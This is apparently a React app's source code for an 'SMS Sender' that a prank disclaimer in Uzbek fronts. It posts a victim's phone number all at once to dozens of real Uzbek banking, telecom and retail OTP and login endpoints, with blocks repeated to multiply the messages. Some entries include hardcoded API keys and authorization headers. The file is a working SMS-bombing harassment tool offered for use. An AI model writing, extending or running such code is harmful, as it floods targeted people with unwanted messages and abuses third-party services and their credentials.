import React, { useState } from "react";
import { Send } from "lucide-react";
import "./App.css";

// Helper function to handle API requests
const sendRequest = async (url, body, method = "POST", headers = {}) => {
  try {
    const response = await fetch(url, {
      method,
      headers: {
        "Content-Type": "application/json",
        ...headers,
      },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      throw new Error(`Error with request to ${url}`);
    }

    return response;
  } catch (error) {
    console.error("Request error:", error);
  }
};

function TermsPage({ onAgree }) {
  const [isAgreed, setIsAgreed] = useState(false);

  return (
    <div className="container">
      <div className="card">
        <h1 className="title">Shartlarga Rozilik</h1>
        <p>
          Eslatib o'tamiz❗️ Bu narsa faqat do'stlaringiz uchun hazil tariqasida
          chiqarildi va bundan yomon maqsatda ishlatilishi taqiqlanadi! Har
          qanday qilingan harakatlar uchun o'zingiz javobgarsiz! Sayt
          yaratuvchilari buni o'z zimmasiga olmaydi!
        </p>

        <label>
          <input
            type="checkbox"
            checked={isAgreed}
            onChange={() => setIsAgreed(!isAgreed)}
          />
          Shartlarga roziman
        </label>

        <button
          onClick={() => onAgree(isAgreed)}
          disabled={!isAgreed}
          className="button"
        >
          Continue
        </button>
      </div>
    </div>
  );
}

function SMSPage() {
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);

  const sendSMS = async () => {
    if (phone.length !== 12) {
      alert("Please enter a valid 12-digit phone number");
      return;
    }

    setLoading(true);

    const apis = [
      { url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify", body: { phone } },
      { url: "https://api.lochin.uz/en/api/v1/e_commerce/register", body: { username: `+${phone}` } },
      

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://api.lochin.uz/en/api/v1/e_commerce/register', body: { username: `+${phone}` } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },
      { url: 'https://api.zon.uz/auth/sign/send-code', body: { mobile: phone } },
      { url: 'https://market.beeline.uz/api/web/auth/login', body: { phone: `+${phone}` } },
      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone: `+${phone}` } },
      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
      { url: 'https://core.bringo.uz/api/v1/customer/users/authenticate', body: { phone, device: { name: navigator.userAgent, serial: crypto.randomUUID(), version: "1.0.0", build: "", fcm_token: "", platform: "web" } } },
      { url: 'https://prod.xmed.uz/Tele-medicine-0.0.1-SNAPSHOT/v2/auth/registration', body: { mobileNumber: `+${phone}` } },
      { url: 'https://api.podium.uz/v1/verify_phone', body: { data: { phone: `+${phone}` } } },
      { url: 'https://back.asakabank.uz/core/v1/get-in-touch-create', body: { name: "Name", phone, type: 1 } },
      { url: 'https://silkroad.ox-sys.com/market-api/sent-verification', body: { phoneNumber: `+${phone}` }, headers: { 'security-key': 'NFfZU_xXfo9D4DMAOrCDLiJ-qufE2jb1aH6YRqYlQ2g=' } },
      { url: 'https://api.7saber.uz/client/sms/send', body: { phone: `+${phone}` }, headers: { 'Authorization': 'Basic Kzk5ODkwMTIzNDU2NzpkY2QwNTRjZjJlYjM5NjIyODQxNGZmMDZmZGQ0MTA4NQ==' } },
      { url: 'https://customer.api.delever.uz/v1/customers/login', body: { phone: `+${phone}` }, headers: { 'Shipper': '0d96ff6b-d880-46e9-bb75-43db31eb0d76' } },
      { url: 'https://api.allgood.uz/auth/send-otp', body: { phone: `+${phone}` }, headers: { 'deviceid': '6c10c22247c90dc53e3f62f8efe9eddb', 'devicetype': 'WEB' } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://www.kattabozor.uz/api/v1/send_sms_code', body: { phoneNumber: phone } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: 'register' } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone } },
      { url: 'https://evsapi.ectn.uz/service/client-auth', body: { phone, lang: 'en' } },
      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {} },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },

      

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://api.lochin.uz/en/api/v1/e_commerce/register', body: { username: `+${phone}` } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },
      { url: 'https://api.zon.uz/auth/sign/send-code', body: { mobile: phone } },
      { url: 'https://market.beeline.uz/api/web/auth/login', body: { phone: `+${phone}` } },
      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone: `+${phone}` } },
      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
      { url: 'https://core.bringo.uz/api/v1/customer/users/authenticate', body: { phone, device: { name: navigator.userAgent, serial: crypto.randomUUID(), version: "1.0.0", build: "", fcm_token: "", platform: "web" } } },
      { url: 'https://prod.xmed.uz/Tele-medicine-0.0.1-SNAPSHOT/v2/auth/registration', body: { mobileNumber: `+${phone}` } },
      { url: 'https://api.podium.uz/v1/verify_phone', body: { data: { phone: `+${phone}` } } },
      { url: 'https://back.asakabank.uz/core/v1/get-in-touch-create', body: { name: "Name", phone, type: 1 } },
      { url: 'https://silkroad.ox-sys.com/market-api/sent-verification', body: { phoneNumber: `+${phone}` }, headers: { 'security-key': 'NFfZU_xXfo9D4DMAOrCDLiJ-qufE2jb1aH6YRqYlQ2g=' } },
      { url: 'https://api.7saber.uz/client/sms/send', body: { phone: `+${phone}` }, headers: { 'Authorization': 'Basic Kzk5ODkwMTIzNDU2NzpkY2QwNTRjZjJlYjM5NjIyODQxNGZmMDZmZGQ0MTA4NQ==' } },
      { url: 'https://customer.api.delever.uz/v1/customers/login', body: { phone: `+${phone}` }, headers: { 'Shipper': '0d96ff6b-d880-46e9-bb75-43db31eb0d76' } },
      { url: 'https://api.allgood.uz/auth/send-otp', body: { phone: `+${phone}` }, headers: { 'deviceid': '6c10c22247c90dc53e3f62f8efe9eddb', 'devicetype': 'WEB' } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://www.kattabozor.uz/api/v1/send_sms_code', body: { phoneNumber: phone } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: 'register' } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone } },
      { url: 'https://evsapi.ectn.uz/service/client-auth', body: { phone, lang: 'en' } },
      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {} },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },

      

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://api.lochin.uz/en/api/v1/e_commerce/register', body: { username: `+${phone}` } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },
      { url: 'https://api.zon.uz/auth/sign/send-code', body: { mobile: phone } },
      { url: 'https://market.beeline.uz/api/web/auth/login', body: { phone: `+${phone}` } },
      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone: `+${phone}` } },
      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
      { url: 'https://core.bringo.uz/api/v1/customer/users/authenticate', body: { phone, device: { name: navigator.userAgent, serial: crypto.randomUUID(), version: "1.0.0", build: "", fcm_token: "", platform: "web" } } },
      { url: 'https://prod.xmed.uz/Tele-medicine-0.0.1-SNAPSHOT/v2/auth/registration', body: { mobileNumber: `+${phone}` } },
      { url: 'https://api.podium.uz/v1/verify_phone', body: { data: { phone: `+${phone}` } } },
      { url: 'https://back.asakabank.uz/core/v1/get-in-touch-create', body: { name: "Name", phone, type: 1 } },
      { url: 'https://silkroad.ox-sys.com/market-api/sent-verification', body: { phoneNumber: `+${phone}` }, headers: { 'security-key': 'NFfZU_xXfo9D4DMAOrCDLiJ-qufE2jb1aH6YRqYlQ2g=' } },
      { url: 'https://api.7saber.uz/client/sms/send', body: { phone: `+${phone}` }, headers: { 'Authorization': 'Basic Kzk5ODkwMTIzNDU2NzpkY2QwNTRjZjJlYjM5NjIyODQxNGZmMDZmZGQ0MTA4NQ==' } },
      { url: 'https://customer.api.delever.uz/v1/customers/login', body: { phone: `+${phone}` }, headers: { 'Shipper': '0d96ff6b-d880-46e9-bb75-43db31eb0d76' } },
      { url: 'https://api.allgood.uz/auth/send-otp', body: { phone: `+${phone}` }, headers: { 'deviceid': '6c10c22247c90dc53e3f62f8efe9eddb', 'devicetype': 'WEB' } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://www.kattabozor.uz/api/v1/send_sms_code', body: { phoneNumber: phone } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: 'register' } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone } },
      { url: 'https://evsapi.ectn.uz/service/client-auth', body: { phone, lang: 'en' } },
      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {} },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },

      // Add more API calls as needed
    ];

    const requests = apis.map((api) => sendRequest(api.url, api.body));

    try {
      await Promise.all(requests);
      setPhone("");
      alert(`SMS so'rovlar muvaffaqiyatli yuborildi!`);
    } catch (err) {
      console.error("Error:", err);
      alert(`SMS so'rovlarini yuborishda xatolik yuz berdi`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container">
      <div className="card">
        <h1 className="title">SMS Sender</h1>

        <div className="input-group">
          <input
            type="text"
            placeholder="998901234567"
            value={phone}
            onChange={(e) =>
              setPhone(e.target.value.replace(/\D/g, "").slice(0, 12))
            }
            className="input"
            disabled={loading}
          />
        </div>

        <button
          onClick={sendSMS}
          disabled={loading || phone.length !== 12}
          className="button"
        >
          {loading ? (
            <div className="spinner" />
          ) : (
            <>
              <Send size={30} />
              Send SMS
            </>
          )}
        </button>
      </div>
    </div>
  );
}

function App() {
  const [showMainPage, setShowMainPage] = useState(false);

  const handleAgree = (isAgreed) => {
    if (isAgreed) {
      setShowMainPage(true);
    } else {
      alert("You must agree to the terms and conditions");
    }
  };

  return showMainPage ? (
    <SMSPage />
  ) : (
    <TermsPage onAgree={handleAgree} />
  );
}

export default App;
